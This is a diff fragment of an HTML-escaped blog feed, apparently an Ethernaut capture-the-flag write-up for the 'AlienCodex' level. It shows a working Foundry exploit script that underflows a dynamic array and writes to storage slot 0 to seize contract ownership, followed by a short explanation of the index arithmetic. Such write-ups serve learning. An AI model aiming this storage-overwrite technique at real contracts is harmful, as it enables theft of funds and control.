+    &lt;span class=&quot;n&quot;&gt;AlienCodex&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ac_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AlienCodex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x018c6FCDb0c6930b1B4Ac8B68a94f0862a358dA7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;external&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;startBroadcast&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+        
+        &lt;span class=&quot;n&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Before Owner: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ac_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;owner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ac_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;makeContact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ac_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;retract&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;ac_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;revise&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;keccak256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;abi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bytes32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint160&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;envAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MY_ADDRESS&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))));&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;After Owner: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ac_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;owner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
+
+        &lt;span class=&quot;n&quot;&gt;vm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stopBroadcast&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~uint256(keccak256(abi.encode(0x1))) + 1&lt;/code&gt; represents the two’s complement of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keccak256(abi.encode(0x1))&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Therefore, when we use this value as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;i&lt;/code&gt; argument in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;revise()&lt;/code&gt; function, adding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keccak256(abi.encode(0x1))&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~uint256(keccak256(abi.encode(0x1))) + 1&lt;/code&gt; results in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;This allows us to attach the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_owner&lt;/code&gt; variable in storage slot &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://0o3q.github.io/images/2025-06-02-AlienCodex/result.png&quot; alt=&quot;image.png&quot; /&gt;&lt;/p&gt;
+</content>
+ </entry>
  
  <entry>
    <title>[Ethernaut] MagicNumber</title>
